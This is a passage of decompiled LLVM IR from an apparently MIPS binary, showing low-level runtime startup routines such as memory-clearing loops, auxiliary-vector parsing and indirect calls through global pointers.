  store i32 0, i32* %v2_4065b8, align 4
  %v0_4065bc = load i32, i32* %v1.global-to-local, align 4
  %v1_4065bc = add i32 %v0_4065bc, -1
  store i32 %v1_4065bc, i32* %v1.global-to-local, align 4
  %v1_4065c0 = mul i32 %v1_4065bc, 4
  %v1_4065c4 = icmp sgt i32 %v1_4065bc, -1
  %v3_4065c4 = load i32, i32* %a1.global-to-local, align 4
  %v4_4065c4 = add i32 %v3_4065c4, %v1_4065c0
  store i32 %v4_4065c4, i32* %v0.global-to-local, align 4
  br i1 %v1_4065c4, label %dec_label_pc_4065b8, label %dec_label_pc_4065c8

dec_label_pc_4065c8:                              ; preds = %dec_label_pc_4065b8
  %v3_4065cc = load i32, i32* @global_var_449400.321, align 4
  store i32 %v3_4065cc, i32* @t9, align 4
  %v2_4065d0 = ptrtoint i32* %tmp9 to i32
  store i32 %arg1, i32* %tmp8, align 4
  store i32 %v2_4065d0, i32* %a0.global-to-local, align 4
  store i32 18, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4065cc)
  store i32 %v2_406588, i32* %gp.global-to-local, align 4
  %v0_4065ec = load i32, i32* %v0.global-to-local, align 4
  %v1_4065ec = icmp slt i32 %v0_4065ec, 0
  %v4_4065ec = ptrtoint i32* %tmp10 to i32
  store i32 %v4_4065ec, i32* %s0.global-to-local, align 4
  br i1 %v1_4065ec, label %dec_label_pc_406794, label %dec_label_pc_4065f0

dec_label_pc_4065f0:                              ; preds = %dec_label_pc_4065c8
  %v3_4065f4 = load i32, i32* @global_var_4493d0.354, align 4
  store i32 %v3_4065f4, i32* @t9, align 4
  store i32 %v2_4065d0, i32* %a1.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4065f4)
  store i32 %v2_406588, i32* %gp.global-to-local, align 4
  %v0_40660c = load i32, i32* %v0.global-to-local, align 4
  %v1_40660c = icmp eq i32 %v0_40660c, 0
  store i32 -1, i32* %v0.global-to-local, align 4
  br i1 %v1_40660c, label %dec_label_pc_406610, label %dec_label_pc_406798

dec_label_pc_406610:                              ; preds = %dec_label_pc_4065f0
  %v3_406614 = load i32, i32* @global_var_449364.322, align 4
  store i32 %v4_4065ec, i32* %a0.global-to-local, align 4
  store i32 18, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406614)
  store i32 %v2_406588, i32* %gp.global-to-local, align 4
  %v0_406628 = load i32, i32* %v0.global-to-local, align 4
  %v1_406628 = icmp eq i32 %v0_406628, 0
  store i32 32, i32* %v1.global-to-local, align 4
  br i1 %v1_406628, label %dec_label_pc_40662c, label %dec_label_pc_406610.dec_label_pc_406750_crit_edge

dec_label_pc_406610.dec_label_pc_406750_crit_edge: ; preds = %dec_label_pc_406610
  %v3_406754.pre = load i32, i32* @global_var_4493f8.361, align 4
  br label %dec_label_pc_406750

dec_label_pc_40662c:                              ; preds = %dec_label_pc_406610
  store i32 %v2_4065b4, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_406638

dec_label_pc_406638:                              ; preds = %dec_label_pc_406638, %dec_label_pc_40662c
  %v0_406638 = phi i32 [ %v4_406644, %dec_label_pc_406638 ], [ 0, %dec_label_pc_40662c ]
  %v1_406638 = add i32 %v0_406638, 8
  %v2_406638 = inttoptr i32 %v1_406638 to i32*
  store i32 0, i32* %v2_406638, align 4
  %v0_40663c = load i32, i32* %v1.global-to-local, align 4
  %v1_40663c = add i32 %v0_40663c, -1
  store i32 %v1_40663c, i32* %v1.global-to-local, align 4
  %v1_406640 = mul i32 %v1_40663c, 4
  %v1_406644 = icmp sgt i32 %v1_40663c, -1
  %v3_406644 = load i32, i32* %a0.global-to-local, align 4
  %v4_406644 = add i32 %v3_406644, %v1_406640
  store i32 %v4_406644, i32* %v0.global-to-local, align 4
  br i1 %v1_406644, label %dec_label_pc_406638, label %dec_label_pc_406648

dec_label_pc_406648:                              ; preds = %dec_label_pc_406638
  %v3_40664c = load i32, i32* @global_var_449400.321, align 4
  store i32 %v3_40664c, i32* @t9, align 4
  store i32 %v2_4065d0, i32* %a0.global-to-local, align 4
  store i32 18, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40664c)
  store i32 %v2_406588, i32* %gp.global-to-local, align 4
  %v0_406660 = load i32, i32* %v0.global-to-local, align 4
  %v1_406660 = icmp slt i32 %v0_406660, 0
  store i32 18, i32* %a0.global-to-local, align 4
  br i1 %v1_406660, label %dec_label_pc_406794, label %dec_label_pc_406664

dec_label_pc_406664:                              ; preds = %dec_label_pc_406648
  %v3_406668 = load i32, i32* @global_var_4494b4.325, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406668)
  store i32 %v2_406588, i32* %gp.global-to-local, align 4
  %v0_40667c = load i32, i32* %v0.global-to-local, align 4
  %v1_40667c = icmp sgt i32 %v0_40667c, -1
  store i32 %v2_4065b4, i32* %s0.global-to-local, align 4
  br i1 %v1_40667c, label %dec_label_pc_406728, label %dec_label_pc_406680

dec_label_pc_406680:                              ; preds = %dec_label_pc_406664
  %v3_406684 = load i32, i32* @global_var_4492e0.262, align 4
  call void @__pseudo_call(i32 %v3_406684)
  store i32 %v2_406588, i32* %gp.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  %v3_40669c = load i32, i32* @global_var_4493d0.354, align 4
  store i32 %v4_4065ec, i32* %a1.global-to-local, align 4
  %v0_4066a8 = load i32, i32* %v0.global-to-local, align 4
  %v1_4066a8 = inttoptr i32 %v0_4066a8 to i32*
  %v2_4066a8 = load i32, i32* %v1_4066a8, align 4
  store i32 %v0_4066a8, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40669c)
  store i32 %v2_406588, i32* %gp.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v2_4066c0 = inttoptr i32 %v0_4066a8 to i32*
  store i32 %v2_4066a8, i32* %v2_4066c0, align 4
  %v0_4066d8.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_406728

dec_label_pc_406728:                              ; preds = %dec_label_pc_406664, %dec_label_pc_406680
  %v0_4066d8 = phi i32 [ %v2_4065b4, %dec_label_pc_406664 ], [ %v0_4066d8.pre, %dec_label_pc_406680 ]
  store i32 1, i32* %v0.global-to-local, align 4
  %v3_4066d4 = load i32, i32* @global_var_4493f8.361, align 4
  store i32 %v0_4066d8, i32* %a0.global-to-local, align 4
  store i32 %v0_4066d8, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4066d4)
  store i32 %v2_406588, i32* %gp.global-to-local, align 4
  %v3_4066ec = load i32, i32* @global_var_4492e0.262, align 4
  call void @__pseudo_call(i32 %v3_4066ec)
  store i32 %v2_406588, i32* %gp.global-to-local, align 4
  store i32 %v4_4065ec, i32* %a1.global-to-local, align 4
  %v3_406704 = load i32, i32* @global_var_4493d0.354, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  %v0_406710 = load i32, i32* %v0.global-to-local, align 4
  %v1_406710 = inttoptr i32 %v0_406710 to i32*
  %v2_406710 = load i32, i32* %v1_406710, align 4
  store i32 %v2_406710, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406704)
  store i32 %v2_406588, i32* %gp.global-to-local, align 4
  %v2_406724 = inttoptr i32 %v0_406710 to i32*
  store i32 %v2_406710, i32* %v2_406724, align 4
  %v0_406728 = load i32, i32* %gp.global-to-local, align 4
  %v1_406728 = add i32 %v0_406728, -32256
  %v2_406728 = inttoptr i32 %v1_406728 to i32*
  %v3_406728 = load i32, i32* %v2_406728, align 4
  store i32 %v4_4065ec, i32* %a1.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406728)
  store i32 %v2_406588, i32* %gp.global-to-local, align 4
  %v0_406740 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_406740, i32* %a0.global-to-local, align 4
  %v3_406744 = load i32, i32* @global_var_4493f8.361, align 4
  store i32 %v0_406740, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_406750

dec_label_pc_406750:                              ; preds = %dec_label_pc_406610.dec_label_pc_406750_crit_edge, %dec_label_pc_406728
  %v3_406754 = phi i32 [ %v3_406754.pre, %dec_label_pc_406610.dec_label_pc_406750_crit_edge ], [ %v3_406744, %dec_label_pc_406728 ]
  store i32 %v2_4065b4, i32* %a0.global-to-local, align 4
  store i32 %v3_406754, i32* @t9, align 4
  store i32 %v2_4065b4, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406754)
  store i32 %v2_406588, i32* %gp.global-to-local, align 4
  %v0_406768 = load i32, i32* %v0.global-to-local, align 4
  %v1_40676c = icmp eq i32 %v0_406768, 0
  store i32 499974144, i32* %v1.global-to-local, align 4
  br i1 %v1_40676c, label %dec_label_pc_40678c, label %dec_label_pc_406770

dec_label_pc_406770:                              ; preds = %dec_label_pc_406750
  %v3_406780 = load i32, i32* %tmp8, align 4
  store i32 %v3_406780, i32* %v1.global-to-local, align 4
  store i32 %v3_406780, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40678c

dec_label_pc_40678c:                              ; preds = %dec_label_pc_406750, %dec_label_pc_406580, %dec_label_pc_406770
  store i32 0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_406794

dec_label_pc_406794:                              ; preds = %dec_label_pc_406648, %dec_label_pc_4065c8, %dec_label_pc_40678c
  store i32 -1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_406798

dec_label_pc_406798:                              ; preds = %dec_label_pc_4065f0, %dec_label_pc_406794
  store i32 %v4_4065a0, i32* @s0, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v3_406754, { 1, 0 }
  uselistorder i32 %v0_4066d8, { 1, 0 }
  uselistorder i32 %v4_406644, { 1, 0 }
  uselistorder i32 %v1_40663c, { 1, 0, 2 }
  uselistorder i32 %v4_4065ec, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v4_4065c4, { 1, 0 }
  uselistorder i32 %v1_4065bc, { 1, 0, 2 }
  uselistorder i32 %v2_4065b4, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v2_406588, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 12 }
  uselistorder i32* %tmp8, { 2, 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 10, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* @global_var_4493f8.361, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_406798, { 1, 0 }
  uselistorder label %dec_label_pc_406794, { 2, 0, 1 }
  uselistorder label %dec_label_pc_40678c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_406750, { 1, 0 }
  uselistorder label %dec_label_pc_406728, { 1, 0 }
}

define i32 @function_4067c0() local_unnamed_addr {
dec_label_pc_4067c0:
  %s0.global-to-local = alloca i32, align 4
  %v1_4067c8 = load i32, i32* @t9, align 4
  %v0_4067d4 = load i32, i32* @s0, align 4
  %v1_4067dc = add i32 %v1_4067c8, 272972
  %v2_4067dc = inttoptr i32 %v1_4067dc to i32*
  %v3_4067dc = load i32, i32* %v2_4067dc, align 4
  %v3_4067e0 = load i32, i32* @global_var_44920c, align 4
  %v2_4067e8 = sub i32 %v3_4067dc, %v3_4067e0
  %v1_4067f0 = sdiv i32 %v2_4067e8, 4
  store i32 %v1_4067f0, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4067f4

dec_label_pc_4067f4:                              ; preds = %dec_label_pc_4067f4, %dec_label_pc_4067c0
  %v0_4067f4 = phi i32 [ %v2_406814, %dec_label_pc_4067f4 ], [ %v3_4067e0, %dec_label_pc_4067c0 ]
  %v1_4067f4 = inttoptr i32 %v0_4067f4 to i32*
  %v2_4067f4 = load i32, i32* %v1_4067f4, align 4
  call void @__pseudo_call(i32 %v2_4067f4)
  %v0_406808 = load i32, i32* %s0.global-to-local, align 4
  %v1_406808 = add i32 %v0_406808, -1
  store i32 %v1_406808, i32* %s0.global-to-local, align 4
  %v3_40680c = load i32, i32* @global_var_44920c, align 4
  %v1_406810 = mul i32 %v1_406808, 4
  %v2_406814 = add i32 %v3_40680c, %v1_406810
  %v2_40681c = icmp eq i32 %v0_406808, 0
  br i1 %v2_40681c, label %dec_label_pc_406820, label %dec_label_pc_4067f4

dec_label_pc_406820:                              ; preds = %dec_label_pc_4067f4
  %v1_406824 = add i32 %v1_4067c8, 272976
  %v2_406824 = inttoptr i32 %v1_406824 to i32*
  %v3_406824 = load i32, i32* %v2_406824, align 4
  %v1_40682c = inttoptr i32 %v3_406824 to i32*
  %v2_40682c = load i32, i32* %v1_40682c, align 4
  %v1_406834 = icmp eq i32 %v2_40682c, 0
  br i1 %v1_406834, label %dec_label_pc_40684c, label %dec_label_pc_406838

dec_label_pc_406838:                              ; preds = %dec_label_pc_406820
  call void @__pseudo_call(i32 %v2_40682c)
  br label %dec_label_pc_40684c

dec_label_pc_40684c:                              ; preds = %dec_label_pc_406820, %dec_label_pc_406838
  %v3_40684c = load i32, i32* bitcast (i32** @global_var_449214.369 to i32*), align 4
  %v1_40685c = icmp eq i32 %v3_40684c, 0
  br i1 %v1_40685c, label %dec_label_pc_40684c.dec_label_pc_406874_crit_edge, label %dec_label_pc_406860

dec_label_pc_40684c.dec_label_pc_406874_crit_edge: ; preds = %dec_label_pc_40684c
  br label %dec_label_pc_406874

dec_label_pc_406860:                              ; preds = %dec_label_pc_40684c
  store i32 %v0_4067d4, i32* %s0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_40684c)
  br label %dec_label_pc_406874

dec_label_pc_406874:                              ; preds = %dec_label_pc_40684c.dec_label_pc_406874_crit_edge, %dec_label_pc_406860
  ret i32 %v3_40684c

; uselistorder directives
  uselistorder i32 %v3_40684c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_406874, { 1, 0 }
  uselistorder label %dec_label_pc_40684c, { 1, 0 }
}

define i32 @function_406884(i32 %arg1) local_unnamed_addr {
dec_label_pc_406884:
  ret i32 0
}

define i32 @function_40688c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40688c:
  %v1_40688c = load i32, i32* @v0, align 4
  ret i32 %v1_40688c
}

define i32 @function_406894(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406894:
  store i32 %arg1, i32* @a0, align 4
  %v3_4068b4 = load i32, i32* @global_var_4491fc.314, align 4
  store i32 %v3_4068b4, i32* @t9, align 4
  store i32 %arg2, i32* @s1, align 4
  store i32 1, i32* @a1, align 4
  store i32 %arg1, i32* @s0, align 4
  %v2_4068c0 = call i32 @function_4049b0()
  %v2_4068d0 = icmp eq i32 %v2_4068c0, -1
  br i1 %v2_4068d0, label %dec_label_pc_4068d4, label %dec_label_pc_406908

dec_label_pc_4068d4:                              ; preds = %dec_label_pc_406894
  %v3_4068dc = load i32, i32* @global_var_4491f4.304, align 4
  store i32 %v3_4068dc, i32* @t9, align 4
  %v1_4068e4 = load i32, i32* @s1, align 4
  store i32 %v1_4068e4, i32* @a1, align 4
  %v6_4068e4 = call i32 @function_404cf0(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_408bd4.370, i32 0, i32 0))
  %v1_4068f0 = load i32, i32* @s0, align 4
  %v2_4068f0 = icmp eq i32 %v6_4068e4, %v1_4068f0
  br i1 %v2_4068f0, label %dec_label_pc_406908, label %dec_label_pc_4068f4

dec_label_pc_4068f4:                              ; preds = %dec_label_pc_4068d4
  %v3_4068f8 = load i32, i32* @global_var_449334.371, align 4
  store i32 %v3_4068f8, i32* @t9, align 4
  %v1_406900 = call i32 @function_407dc0()
  br label %dec_label_pc_406908

dec_label_pc_406908:                              ; preds = %dec_label_pc_406894, %dec_label_pc_4068d4, %dec_label_pc_4068f4
  %v4_406914 = phi i32 [ %v2_4068c0, %dec_label_pc_406894 ], [ %v6_4068e4, %dec_label_pc_4068d4 ], [ %v1_406900, %dec_label_pc_4068f4 ]
  ret i32 %v4_406914

; uselistorder directives
  uselistorder i32 ()* @function_4049b0, { 7, 6, 1, 0, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_406908, { 2, 1, 0 }
}

define i32 @function_40691c() local_unnamed_addr {
dec_label_pc_40691c:
  %v3_40693c = load i32, i32* @global_var_449584.372, align 4
  %v1_406944 = icmp eq i32 %v3_40693c, 0
  br i1 %v1_406944, label %dec_label_pc_406948, label %dec_label_pc_406998

dec_label_pc_406948:                              ; preds = %dec_label_pc_40691c
  store i32 1, i32* @global_var_449584.372, align 4
  %v3_406950 = load i32, i32* bitcast (i32** @global_var_4492f4.332 to i32*), align 4
  %v2_406958 = inttoptr i32 %v3_406950 to i32*
  store i32 4096, i32* %v2_406958, align 4
  %v3_40695c = load i32, i32* @global_var_4493ac.373, align 4
  %v1_406964 = icmp eq i32 %v3_40695c, 0
  br i1 %v1_406964, label %dec_label_pc_40697c, label %dec_label_pc_406968

dec_label_pc_406968:                              ; preds = %dec_label_pc_406948
  %v1_40696c = call i32 @unknown_0()
  br label %dec_label_pc_40697c

dec_label_pc_40697c:                              ; preds = %dec_label_pc_406948, %dec_label_pc_406968
  %v3_40697c = load i32, i32* @global_var_4492d8.374, align 4
  %v1_406984 = icmp eq i32 %v3_40697c, 0
  br i1 %v1_406984, label %dec_label_pc_406998, label %dec_label_pc_406988

dec_label_pc_406988:                              ; preds = %dec_label_pc_40697c
  %v4_406990 = call i32 @unknown_0()
  br label %dec_label_pc_406998

dec_label_pc_406998:                              ; preds = %dec_label_pc_40691c, %dec_label_pc_40697c, %dec_label_pc_406988
  %v4_4069a0 = phi i32 [ 1, %dec_label_pc_40691c ], [ 0, %dec_label_pc_40697c ], [ %v4_406990, %dec_label_pc_406988 ]
  ret i32 %v4_4069a0

; uselistorder directives
  uselistorder label %dec_label_pc_406998, { 2, 1, 0 }
  uselistorder label %dec_label_pc_40697c, { 1, 0 }
}

define i32 @function_4069a8(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_4069a8:
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %a2.global-to-local, align 4
  store i32 %arg2, i32* %a1.global-to-local, align 4
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-152 = alloca i32, align 4
  %v1_4069b0 = load i32, i32* @t9, align 4
  %v2_4069b0 = add i32 %v1_4069b0, 305192
  store i32 %v2_4069b0, i32* %gp.global-to-local, align 4
  %v1_4069d8 = mul i32 %arg2, 4
  store i32 %tmp, i32* %s2.global-to-local, align 4
  %v2_4069e4 = add i32 %tmp, %v1_4069d8
  store i32 %v2_4069e4, i32* %a2.global-to-local, align 4
  %v3_4069e8 = load i32, i32* bitcast (i32** @global_var_449494.375 to i32*), align 4
  %v3_4069ec = load i32, i32* bitcast (i32** @global_var_44942c.377 to i32*), align 4
  store i32 %v3_4069ec, i32* %s0.global-to-local, align 4
  %v2_4069f0 = inttoptr i32 %v3_4069e8 to i32*
  store i32 %arg7, i32* %v2_4069f0, align 4
  %v3_4069f4 = load i32, i32* bitcast (i32** @global_var_449214.369 to i32*), align 4
  store i32 %v3_4069f4, i32* %v0.global-to-local, align 4
  store i32 %arg6, i32* %v1.global-to-local, align 4
  %v0_406a00 = load i32, i32* %a2.global-to-local, align 4
  %v1_406a00 = add i32 %v0_406a00, 4
  store i32 %v1_406a00, i32* %a1.global-to-local, align 4
  %v2_406a04 = inttoptr i32 %v3_4069f4 to i32*
  store i32 %arg6, i32* %v2_406a04, align 4
  %v0_406a08 = load i32, i32* %a1.global-to-local, align 4
  %v1_406a08 = load i32, i32* %s0.global-to-local, align 4
  %v2_406a08 = inttoptr i32 %v1_406a08 to i32*
  store i32 %v0_406a08, i32* %v2_406a08, align 4
  %v0_406a0c = load i32, i32* %s2.global-to-local, align 4
  %v1_406a0c = inttoptr i32 %v0_406a0c to i32*
  %v2_406a0c = load i32, i32* %v1_406a0c, align 4
  store i32 %v2_406a0c, i32* %v0.global-to-local, align 4
  store i32 %arg1, i32* %s5.global-to-local, align 4
  %v0_406a14 = load i32, i32* %a1.global-to-local, align 4
  %v2_406a14 = icmp eq i32 %v0_406a14, %v2_406a0c
  store i32 %arg4, i32* %s3.global-to-local, align 4
  br i1 %v2_406a14, label %dec_label_pc_406a18, label %dec_label_pc_406a20

dec_label_pc_406a18:                              ; preds = %dec_label_pc_4069a8
  %v0_406a1c = load i32, i32* %a2.global-to-local, align 4
  %v1_406a1c = load i32, i32* %s0.global-to-local, align 4
  %v2_406a1c = inttoptr i32 %v1_406a1c to i32*
  store i32 %v0_406a1c, i32* %v2_406a1c, align 4
  br label %dec_label_pc_406a20

dec_label_pc_406a20:                              ; preds = %dec_label_pc_4069a8, %dec_label_pc_406a18
  %v2_406a24 = ptrtoint i32* %stack_var_-152 to i32
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 120, i32* %a2.global-to-local, align 4
  %v5_406a2c = call i32 @function_405660(i32* nonnull %stack_var_-152, i32 0, i32 120)
  store i32 %v5_406a2c, i32* %v0.global-to-local, align 4
  store i32 %v2_4069b0, i32* %gp.global-to-local, align 4
  %v2_406a38 = load i32, i32* bitcast (i32** @global_var_44942c.377 to i32*), align 4
  store i32 %v2_406a38, i32* %v1.global-to-local, align 4
  %v0_406a44.pre = load i32, i32* @a1, align 4
  br label %dec_label_pc_406a44

dec_label_pc_406a44:                              ; preds = %dec_label_pc_406a44, %dec_label_pc_406a20
  %v0_406a44 = phi i32 [ %v3_406a50, %dec_label_pc_406a44 ], [ %v0_406a44.pre, %dec_label_pc_406a20 ]
  store i32 %v0_406a44, i32* %v1.global-to-local, align 4
  %v1_406a48 = inttoptr i32 %v0_406a44 to i32*
  %v2_406a48 = load i32, i32* %v1_406a48, align 4
  store i32 %v2_406a48, i32* %v0.global-to-local, align 4
  %v1_406a50 = icmp eq i32 %v2_406a48, 0
  %v3_406a50 = add i32 %v0_406a44, 4
  store i32 %v3_406a50, i32* %a1.global-to-local, align 4
  br i1 %v1_406a50, label %dec_label_pc_406a54, label %dec_label_pc_406a44

dec_label_pc_406a54:                              ; preds = %dec_label_pc_406a44
  store i32 %v3_406a50, i32* @s0, align 4
  br label %dec_label_pc_406a60

dec_label_pc_406a60:                              ; preds = %dec_label_pc_406a84, %dec_label_pc_406a54
  %v0_406a74 = phi i32 [ %v1_406a84, %dec_label_pc_406a84 ], [ %v3_406a50, %dec_label_pc_406a54 ]
  %v0_406a60 = phi i32 [ %v4_406a90, %dec_label_pc_406a84 ], [ 0, %dec_label_pc_406a54 ]
  %v1_406a60 = icmp eq i32 %v0_406a60, 0
  store i32 %v2_406a24, i32* %v0.global-to-local, align 4
  br i1 %v1_406a60, label %dec_label_pc_406a84, label %dec_label_pc_406a64

dec_label_pc_406a64:                              ; preds = %dec_label_pc_406a60
  %v0_406a6c = load i32, i32* @a0, align 4
  %v1_406a6c = mul i32 %v0_406a6c, 8
  %v2_406a70 = add i32 %v1_406a6c, %v2_406a24
  store i32 %v0_406a74, i32* %a1.global-to-local, align 4
  store i32 8, i32* %a2.global-to-local, align 4
  %v4_406a78 = inttoptr i32 %v0_406a74 to i8*
  %v5_406a78 = call i32 @function_407830(i32 %v2_406a70, i8* %v4_406a78, i32 8)
  store i32 %v5_406a78, i32* %v0.global-to-local, align 4
  store i32 %v2_4069b0, i32* %gp.global-to-local, align 4
  %v0_406a84.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_406a84

dec_label_pc_406a84:                              ; preds = %dec_label_pc_406a60, %dec_label_pc_406a64
  %v0_406a84 = phi i32 [ %v0_406a74, %dec_label_pc_406a60 ], [ %v0_406a84.pre, %dec_label_pc_406a64 ]
  %v1_406a84 = add i32 %v0_406a84, 8
  store i32 %v1_406a84, i32* @s0, align 4
  %v1_406a88 = inttoptr i32 %v1_406a84 to i32*
  %v2_406a88 = load i32, i32* %v1_406a88, align 4
  store i32 %v2_406a88, i32* @a0, align 4
  %v1_406a90 = icmp eq i32 %v2_406a88, 0
  %v3_406a90 = icmp ult i32 %v2_406a88, 15
  %v4_406a90 = zext i1 %v3_406a90 to i32
  store i32 %v4_406a90, i32* %v0.global-to-local, align 4
  br i1 %v1_406a90, label %dec_label_pc_406a94, label %dec_label_pc_406a60

dec_label_pc_406a94:                              ; preds = %dec_label_pc_406a84
  %v3_406a98 = load i32, i32* @global_var_4492c8.380, align 4
  store i32 %v3_406a98, i32* @t9, align 4
  %v5_406aa0 = call i32 @function_407f70(i32 %v2_406a24)
  store i32 %v5_406aa0, i32* %v0.global-to-local, align 4
  store i32 %v2_4069b0, i32* %gp.global-to-local, align 4
  %v3_406ab0 = load i32, i32* @global_var_449218.381, align 4
  store i32 %v3_406ab0, i32* @t9, align 4
  %v1_406ab8 = call i32 @function_40691c()
  store i32 %v1_406ab8, i32* %v0.global-to-local, align 4
  store i32 %tmp27, i32* %v1.global-to-local, align 4
  store i32 %v2_4069b0, i32* %gp.global-to-local, align 4
  %v1_406ac8 = icmp eq i32 %tmp27, 0
  br i1 %v1_406ac8, label %dec_label_pc_406acc, label %dec_label_pc_406ad4

dec_label_pc_406acc:                              ; preds = %dec_label_pc_406a94
  store i32 4096, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_406ad4

dec_label_pc_406ad4:                              ; preds = %dec_label_pc_406a94, %dec_label_pc_406acc
  %v0_406adc = phi i32 [ %tmp27, %dec_label_pc_406a94 ], [ 4096, %dec_label_pc_406acc ]
  %v3_406ad4 = load i32, i32* bitcast (i32** @global_var_4492f4.332 to i32*), align 4
  store i32 -1, i32* %s1.global-to-local, align 4
  %v2_406adc = inttoptr i32 %v3_406ad4 to i32*
  store i32 %v0_406adc, i32* %v2_406adc, align 4
  store i32 %tmp26, i32* %v0.global-to-local, align 4
  %v1_406ae8 = load i32, i32* %s1.global-to-local, align 4
  %v2_406ae8 = icmp eq i32 %tmp26, %v1_406ae8
  br i1 %v2_406ae8, label %dec_label_pc_406aec, label %dec_label_pc_406b58

dec_label_pc_406aec:                              ; preds = %dec_label_pc_406ad4
  %v3_406af0 = load i32, i32* @global_var_4492b4.382, align 4
  store i32 %v3_406af0, i32* @t9, align 4
  %v1_406af8 = call i32 @function_4072f0()
  store i32 %v1_406af8, i32* %v0.global-to-local, align 4
  store i32 %v2_4069b0, i32* %gp.global-to-local, align 4
  %v3_406b08 = load i32, i32* @global_var_4492d4.383, align 4
  store i32 %v3_406b08, i32* @t9, align 4
  store i32 %v1_406af8, i32* @s0, align 4
  %v2_406b10 = call i32 @function_407230()
  store i32 %v2_406b10, i32* %v0.global-to-local, align 4
  store i32 %v2_4069b0, i32* %gp.global-to-local, align 4
  %v0_406b1c = load i32, i32* @s0, align 4
  %v2_406b1c = icmp eq i32 %v0_406b1c, %v2_406b10
  br i1 %v2_406b1c, label %dec_label_pc_406b20, label %dec_label_pc_406b8c

dec_label_pc_406b20:                              ; preds = %dec_label_pc_406aec
  %v3_406b24 = load i32, i32* @global_var_449418.384, align 4
  store i32 %v3_406b24, i32* @t9, align 4
  %v1_406b2c = call i32 @function_407290()
  store i32 %v1_406b2c, i32* %v0.global-to-local, align 4
  store i32 %v2_4069b0, i32* %gp.global-to-local, align 4
  %v3_406b3c = load i32, i32* @global_var_449374.385, align 4
  store i32 %v3_406b3c, i32* @t9, align 4
  store i32 %v1_406b2c, i32* @s0, align 4
  %v2_406b44 = call i32 @function_4071d0()
  store i32 %v2_406b44, i32* %v0.global-to-local, align 4
  store i32 %v2_4069b0, i32* %gp.global-to-local, align 4
  %v0_406b50 = load i32, i32* @s0, align 4
  %v2_406b50 = icmp eq i32 %v0_406b50, %v2_406b44
  br i1 %v2_406b50, label %dec_label_pc_406b20.dec_label_pc_406b58_crit_edge, label %dec_label_pc_406b8c

dec_label_pc_406b20.dec_label_pc_406b58_crit_edge: ; preds = %dec_label_pc_406b20
  %v1_406b60.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_406b58

dec_label_pc_406b58:                              ; preds = %dec_label_pc_406b20.dec_label_pc_406b58_crit_edge, %dec_label_pc_406ad4
  %v1_406b60 = phi i32 [ %v1_406b60.pre, %dec_label_pc_406b20.dec_label_pc_406b58_crit_edge ], [ %v1_406ae8, %dec_label_pc_406ad4 ]
  store i32 %tmp26, i32* %v1.global-to-local, align 4
  %v2_406b60 = icmp eq i32 %tmp26, %v1_406b60
  br i1 %v2_406b60, label %dec_label_pc_406bd0, label %dec_label_pc_406b64

dec_label_pc_406b64:                              ; preds = %dec_label_pc_406b58
  store i32 %tmp25, i32* %v0.global-to-local, align 4
  %v2_406b70 = icmp eq i32 %tmp26, %tmp25
  br i1 %v2_406b70, label %dec_label_pc_406b74, label %dec_label_pc_406b8c

dec_label_pc_406b74:                              ; preds = %dec_label_pc_406b64
